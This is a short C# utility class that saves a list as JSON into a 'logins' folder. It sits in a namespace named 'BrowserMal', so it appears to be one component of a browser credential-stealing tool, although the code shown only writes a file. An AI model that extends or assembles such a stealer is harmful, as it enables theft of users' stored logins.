using Newtonsoft.Json;
using System.Collections.Generic;
using System.Text;

namespace BrowserMal.Filesaver
{
    public class FileManager
    {
        public static void Save<T>(List<T> list, string outputPath)
        {
            string json = JsonConvert.SerializeObject(list, Formatting.Indented);
            System.IO.File.WriteAllText(@"logins\" + outputPath, json);
        }
    }
}
